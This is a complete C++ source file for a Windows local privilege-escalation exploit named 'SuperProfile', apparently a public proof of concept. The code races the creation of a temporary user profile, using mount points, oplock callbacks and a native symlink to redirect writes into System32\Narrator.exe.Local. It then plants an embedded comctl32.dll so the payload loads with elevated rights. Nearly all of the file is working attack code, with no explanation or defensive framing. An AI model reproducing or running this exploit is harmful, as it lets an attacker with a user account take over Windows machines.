
// SuperProfile vulnerability
// works on all windows versions
// tested on Windows 10 21H2, Windows 11, Windows Server 2022
#include <iostream>
#include <stdio.h>
#include <Windows.h>
#include <UserEnv.h>
#include <lmcons.h>
#include <conio.h>
#include <ShlObj.h>
#include <AclAPI.h>
#include <sddl.h>
#include <TlHelp32.h>
#include "Win-Ops-Master.h"
#include "resource.h"
#pragma warning(disable : 4996)
#pragma comment(lib,"userenv.lib")
#pragma comment(lib,"shlwapi.lib")


HANDLE _token = nullptr;
OpsMaster op;
wchar_t* user_temp_dir = nullptr;
wchar_t* appdata = nullptr;
wchar_t* appdata_local = nullptr;
wchar_t* appdata_local_appdata = nullptr;
HANDLE happdata_local = nullptr;
HANDLE happdata = nullptr;
lock_ptr appdata_lock = nullptr;
HANDLE hlnk = nullptr;
void err(const wchar_t* fc, DWORD err, DWORD line) {

	LPCWSTR errbuff = nullptr;
	int sz = FormatMessageW(
		FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, err, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPWSTR)&errbuff, NULL, NULL);
	wprintf(L"%s has returned an unexpected error %d in line %d\n%s",
		fc, err, line, errbuff);
	HeapFree(GetProcessHeap(), NULL, (LPVOID)errbuff);
	ExitProcess(1);
}
struct thread_argv {
	wchar_t* username;
	wchar_t* password;
};

DWORD WINAPI worker(void* argv) {
	DWORD sz = ExpandEnvironmentStrings(L"%windir%\\notepad.exe", nullptr, 0);
	wchar_t* ntpd = (wchar_t*)HeapAlloc(GetProcessHeap(),
		HEAP_ZERO_MEMORY, sz * sizeof(wchar_t));
	ExpandEnvironmentStrings(L"%windir%\\notepad.exe", ntpd, sz);
	thread_argv* tav = (thread_argv*)argv;
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	if (!CreateProcessWithLogonW(tav->username, NULL, tav->password,
		LOGON_WITH_PROFILE, ntpd, NULL, CREATE_SUSPENDED, NULL, NULL,
		&si, &pi))
		err(L"CreateProcessWithLogonW", GetLastError(), __LINE__);
	TerminateProcess(pi.hProcess, ERROR_SUCCESS);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	HeapFree(GetProcessHeap(), NULL, ntpd);
	return ERROR_SUCCESS;
}
void callback2();
bool RemoveDirNotParent(std::wstring dir)
{
	DWORD fst_attr = GetFileAttributes(dir.c_str());
	if (fst_attr & FILE_ATTRIBUTE_NORMAL)
		return op.DeleteFileNative(dir);
	if (fst_attr & FILE_ATTRIBUTE_REPARSE_POINT)
		return RemoveDirectory(dir.c_str());
	std::wstring search_path = std::wstring(dir) + L"\\*.*";
	std::wstring s_p = std::wstring(dir) + std::wstring(L"\\");
	WIN32_FIND_DATA fd;
	HANDLE hFind = FindFirstFile(search_path.c_str(), &fd);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0)
			{
				continue;
			}
			if (fd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) {
				RemoveDirectory(std::wstring(s_p + fd.cFileName).c_str());
				continue;
			}
			if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
				op.DeleteFileNative(std::wstring(s_p + fd.cFileName));
				continue;
			}
			if (wcscmp(fd.cFileName, L".") != 0 && wcscmp(fd.cFileName, L"..") != 0)
			{
				op.RRemoveDirectory(s_p + fd.cFileName);
			}
		} while (FindNextFile(hFind, &fd));
		FindClose(hFind);
	}
	return true;
}
void callback1() {
	if (!ImpersonateLoggedOnUser(_token))
		err(L"ImpersonateLoggedOnUser", GetLastError(), __LINE__);
	if (!op.MoveFileToTempDir(happdata_local, USE_SYSTEM_TEMP_DIR))
		err(L"MoveFileToTempDir", op.GetLastErr(), __LINE__);
	op.DeleteByHandle(happdata_local);

	RemoveDirNotParent(appdata);
	if(!op.MoveFileToTempDir(std::wstring(appdata),true,USE_SYSTEM_TEMP_DIR))
		err(L"MoveFileToTempDir", op.GetLastErr(), __LINE__);
	happdata = op.OpenDirectory(appdata, GENERIC_READ | GENERIC_WRITE, ALL_SHARING);
	if (!happdata)
		err(L"OpenDirectory", op.GetLastErr(), __LINE__);
	if (!op.CreateMountPoint(happdata, L"C:\\Users\\Default\\Appdata"))
		err(L"CreateMountPoint", op.GetLastErr(), __LINE__);
	appdata_lock = op.CreateLock(happdata, callback2);
	if (!appdata_lock)
		err(L"CreateLock", op.GetLastErr(), __LINE__);
	RevertToSelf();
}
void callback2() {
	if (!ImpersonateLoggedOnUser(_token))
		err(L"ImpersonateLoggedOnUser", GetLastError(), __LINE__);
	if (!op.DeleteMountPoint(happdata))
		err(L"DeleteMountPoint", op.GetLastErr(), __LINE__);
	happdata_local = op.OpenDirectory(appdata_local, GENERIC_WRITE, ALL_SHARING, OPEN_ALWAYS);
	if(!happdata_local)
		err(L"OpenDirectory", op.GetLastErr(), __LINE__);
	if(!op.CreateMountPoint(happdata_local,L"\\BaseNamedObjects\\Restricted"))
		err(L"CreateMountPoint", op.GetLastErr(), __LINE__);
	CloseHandle(happdata_local);
	hlnk = op.CreateNativeSymlink(L"\\BaseNamedObjects\\Restricted\\Application Data", L"\\??\\C:\\Windows\\System32\\Narrator.exe.Local");
	if (!hlnk)
		err(L"CreateNativeSymlink", op.GetLastErr(), __LINE__);
}

void DoDropPayload() {
	HMODULE hm = GetModuleHandle(NULL);
	HRSRC res = FindResource(hm, MAKEINTRESOURCE(IDR_DLL1), L"dll");
	DWORD DllSize = SizeofResource(hm, res);
	void* DllBuff = LoadResource(hm, res);
	WIN32_FIND_DATA data = { 0 };
	HANDLE hfind = FindFirstFile(L"C:\\Windows\\WinSxS\\amd64_microsoft.windows.common-controls_*_none_*", &data);
	std::wstring narrator_dir = L"C:\\Windows\\System32\\Narrator.exe.Local\\";
	std::wstring _dll_dir = narrator_dir + data.cFileName;
	CreateDirectory(_dll_dir.c_str(), NULL);
	std::wstring _dll = _dll_dir + L"\\comctl32.dll";
	HANDLE hdll = op.OpenFileNative(_dll, GENERIC_WRITE, ALL_SHARING, CREATE_ALWAYS);
	op.WriteFileNative(hdll, DllBuff, DllSize);
	CloseHandle(hdll);
	while (FindNextFileW(hfind, &data) == TRUE) {

		_dll_dir = narrator_dir + data.cFileName;
		CreateDirectory(_dll_dir.c_str(), NULL);
		_dll = _dll_dir + L"\\comctl32.dll";
		hdll = op.OpenFileNative(_dll, GENERIC_WRITE, ALL_SHARING, CREATE_ALWAYS);
		op.WriteFileNative(hdll, DllBuff, DllSize);
		CloseHandle(hdll);
	}
	return;
}
void KillProcessByName(const wchar_t* filename)
{
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
	PROCESSENTRY32 pEntry;
	pEntry.dwSize = sizeof(pEntry);
	BOOL hRes = Process32First(hSnapShot, &pEntry);
	while (hRes)
	{
		if (wcsicmp(pEntry.szExeFile, filename) == 0)
		{
			HANDLE hProcess = OpenProcess(MAXIMUM_ALLOWED, 0,
				(DWORD)pEntry.th32ProcessID);
			if (hProcess != NULL)
			{
				TerminateProcess(hProcess, ERROR_SUCCESS);
				CloseHandle(hProcess);
			}
		}
		hRes = Process32Next(hSnapShot, &pEntry);
	}
	CloseHandle(hSnapShot);
}

int wmain(int argc, wchar_t* argv[]) {


	if (argc != 3) {
		wprintf(L"Usage : %s |user name| |password|", argv[0]);
		return 1;
	}
	wchar_t current_user[512];
	ExpandEnvironmentStrings(L"%USERNAME%", current_user, 512);
	if (!wcsicmp(current_user, argv[1])) {
		printf("The current user and the specified user cannot be the same.");
		return 1;
	}
	ExpandEnvironmentStrings(L"%USERDOMAIN%\\%USERNAME%", current_user, 512);
	if (!wcsicmp(current_user, argv[1])) {
		printf("The current user and the specified user cannot be the same.");
		return 1;
	}


	if (!LogonUser(argv[1], NULL, argv[2], LOGON32_LOGON_INTERACTIVE,
		LOGON32_PROVIDER_DEFAULT, &_token))
		err(L"LogonUser", GetLastError(), __LINE__);
	SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
	Wow64EnableWow64FsRedirection(FALSE);

	thread_argv thrd_argv = { argv[1],argv[2] };
	HANDLE hthread = CreateThread(NULL, NULL, worker, (void*)&thrd_argv, NULL, NULL);
	WaitForSingleObject(hthread, INFINITE);
	CloseHandle(hthread);
	ShellExecute(NULL, L"open",
		L"C:\\Windows\\System32\\Narrator.exe", NULL, NULL, SW_FORCEMINIMIZE);
	if (!ImpersonateLoggedOnUser(_token))
		err(L"ImpersonateLoggedOnUser", op.GetLastErr(), __LINE__);
	wchar_t user_registry_path[MAX_PATH];
	ExpandEnvironmentStringsForUser(_token,
		L"C:\\Users\\%USERNAME%\\ntuser.dat", user_registry_path, MAX_PATH);
	HANDLE huserdat = NULL;
	do {
		huserdat = op.OpenFileNative(user_registry_path, GENERIC_READ, NULL, OPEN_ALWAYS);
	} while (!huserdat);
	HANDLE husers_dir = op.OpenDirectory("C:\\Users", GENERIC_READ);
	if (!husers_dir)
		err(L"OpenDirectory", op.GetLastErr(), __LINE__);
	FILE_NOTIFY_INFORMATION* fni =
		(FILE_NOTIFY_INFORMATION*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 4096);
	wchar_t new_dir[MAX_PATH];
	hthread = CreateThread(NULL, NULL, worker, (void*)&thrd_argv, NULL, NULL);
	if (!hthread) {
		err(L"CreateThread", GetLastError(), __LINE__);
	}
	do {
		ZeroMemory(new_dir, MAX_PATH);
		DWORD ret_sz = 0;
		if (!ReadDirectoryChangesW(husers_dir, fni, 4096, TRUE, FILE_NOTIFY_CHANGE_DIR_NAME,
			&ret_sz, nullptr, nullptr))
			err(L"ReadDirectoryChangesW", GetLastError(), __LINE__);
		if (fni->Action != FILE_ACTION_ADDED)
			continue;
		memcpy(new_dir, fni->FileName, fni->FileNameLength);
		new_dir[fni->FileNameLength / 2] = L'\0';
		if (wcschr(new_dir, L'\\'))
			continue;
		WCHAR cmp[5] = { 0 };
		wmemcpy(cmp, new_dir, 4);
		cmp[4] = L'\0';
		if (wcscmp(cmp, L"TEMP"))
			continue;
		break;
	} while (1);
	size_t user_temp_dir_sz = (10 + lstrlenW(new_dir)) * sizeof(wchar_t);
	user_temp_dir = (wchar_t*)HeapAlloc(GetProcessHeap(),
		HEAP_ZERO_MEMORY, user_temp_dir_sz);
	wmemcpy(user_temp_dir, L"C:\\Users\\\0", 10);
	wcscat(user_temp_dir, new_dir);

	wchar_t* lock_file = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, user_temp_dir_sz + (6 * sizeof(wchar_t)));
	wcscpy(lock_file, user_temp_dir);
	wcscat(lock_file, L"\\.lock");
	HANDLE hlock_file = op.OpenFileNative(lock_file, GENERIC_READ | DELETE, NULL, CREATE_ALWAYS);
	if (!hlock_file)
		err(L"OpenFileNative", op.GetLastErr(), __LINE__);
	appdata = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, user_temp_dir_sz + (8 * sizeof(wchar_t)));
	appdata_local = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, user_temp_dir_sz + (14 * sizeof(wchar_t)));
	appdata_local_appdata = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, user_temp_dir_sz + (31 * sizeof(wchar_t)));

	wcscpy(appdata, user_temp_dir);
	wcscat(appdata, L"\\AppData\0");
	wcscpy(appdata_local, appdata);
	wcscat(appdata_local, L"\\Local\0");
	wcscpy(appdata_local_appdata, appdata_local);
	wcscat(appdata_local_appdata, L"\\Application Data\0");
	SHCreateDirectory(NULL, appdata);
	wchar_t __tmp[MAX_PATH];
	ExpandEnvironmentStrings(std::wstring(L"%windir%\\Temp\\" + op.GenerateRandomStr()).c_str(),
		__tmp, MAX_PATH);
	PSECURITY_DESCRIPTOR sd;
	ULONG sd_sz = 0;
	ConvertStringSecurityDescriptorToSecurityDescriptor(
		L"D:PAI(A;OICI;FA;;;WD)", SDDL_REVISION_1, &sd, &sd_sz);
	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES),sd,FALSE };
	if (!CreateDirectory(__tmp, &sa))
		err(L"CreateDirectory", GetLastError(), __LINE__);
	happdata_local = op.OpenDirectory(appdata_local, GENERIC_READ | GENERIC_WRITE | DELETE);
	if (!happdata_local)
		err(L"OpenDirectory", op.GetLastErr(), __LINE__);
	if (!op.CreateMountPoint(happdata_local, __tmp))
		err(L"CreateMountPoint", op.GetLastErr(), __LINE__);
	op.CreateAndWaitLock(happdata_local, callback1);
	if (appdata_lock) {
		appdata_lock->WaitForLock(INFINITE);
		delete appdata_lock;
	}
	WaitForSingleObject(hthread, INFINITE);
	CloseHandle(hthread);
	if (GetFileAttributes(L"C:\\Windows\\System32\\narrator.exe.local") == INVALID_FILE_ATTRIBUTES) {
		printf("Exploit failed - Creating C:\\Windows\\System32\\narrator.exe.local was unsuccessfull\n");
		return 1;
	}

	op.RRemoveDirectory(__tmp);
	Sleep(5000);
	CloseHandle(hlock_file);
	SHCreateDirectory(NULL, appdata_local_appdata);
	DoDropPayload();
	ShellExecute(NULL, L"runas", L"C:\\Windows\\notepad.exe", NULL, NULL, SW_SHOW);
	op.RRemoveDirectory(__tmp);
	RevertToSelf();
	CloseHandle(huserdat);
	CloseHandle(husers_dir);
	CloseHandle(hlnk);
	CloseHandle(_token);
	HeapFree(GetProcessHeap(), NULL, user_temp_dir);
	HeapFree(GetProcessHeap(), NULL, fni);
	HeapFree(GetProcessHeap(), NULL, lock_file);
	HeapFree(GetProcessHeap(), NULL, appdata);
	HeapFree(GetProcessHeap(), NULL, appdata_local);
	HeapFree(GetProcessHeap(), NULL, appdata_local_appdata);
	return ERROR_SUCCESS;
}